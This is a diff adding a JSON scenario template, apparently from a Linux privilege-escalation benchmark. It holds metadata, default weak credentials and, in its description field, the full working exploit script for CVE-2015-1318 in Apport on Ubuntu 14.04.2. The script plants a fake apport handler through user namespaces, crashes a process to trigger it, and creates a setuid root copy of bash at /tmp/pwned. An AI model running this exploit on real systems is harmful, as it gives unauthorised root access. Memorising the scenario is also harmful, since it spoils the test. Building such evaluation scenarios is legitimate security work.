@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_36782",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation (CVE-2015-1318;OSVDB-120803)\n\nExploit source code (36782.sh):\n```\n#!/bin/sh\n#\n# CVE-2015-1318\n#\n# Reference: https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758\n#\n# Example:\n#\n# % uname -a\n# Linux maggie 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n#\n# % lsb_release -a\n# No LSB modules are available.\n# Distributor ID: Ubuntu\n# Description:    Ubuntu 14.04.2 LTS\n# Release:    14.04\n# Codename:   trusty\n#\n# % dpkg -l | grep '^ii  apport ' | awk -F ' '  '{ print $2 \" \" $3 }'\n# apport 2.14.1-0ubuntu3.8\n#\n# % id\n# uid=1000(ricardo) gid=1000(ricardo) groups=1000(ricardo) (...)\n#\n# % ./apport.sh\n# pwned-4.3# id\n# uid=1000(ricardo) gid=1000(ricardo) euid=0(root) groups=0(root) (...)\n# pwned-4.3# exit\n\nTEMPDIR=$(mktemp -d)\n\ncd ${TEMPDIR}\n\ncp /bin/busybox .\n\nmkdir -p dev mnt usr/share/apport\n\n(\ncat << EOF\n#!/busybox sh\n(\ncp /mnt/1/root/bin/bash /mnt/1/root/tmp/pwned\nchmod 5755 /mnt/1/root/tmp/pwned\n)\nEOF\n\n) > usr/share/apport/apport\n\nchmod +x usr/share/apport/apport\n\n(\ncat << EOF\nmount -o bind . .\ncd .\nmount --rbind /proc mnt\ntouch dev/null\npivot_root . .\n./busybox sleep 500 &\nSLEEP=\\$!\n./busybox sleep 1\n./busybox kill -11 \\$SLEEP\n./busybox sleep 5\nEOF\n) | lxc-usernsexec -m u:0:$(id -u):1 -m g:0:$(id -g):1 2>&1 >/dev/null -- \\\n    lxc-unshare -s \"MOUNT|PID|NETWORK|UTSNAME|IPC\" -- /bin/sh 2>&1 >/dev/null\n\n/tmp/pwned -p\n\nrm -Rf ${TEMPDIR}\n```",
+  "cve": "CVE-2015-1318;OSVDB-120803",
+  "exploitdb_id": "36782",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_36782",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
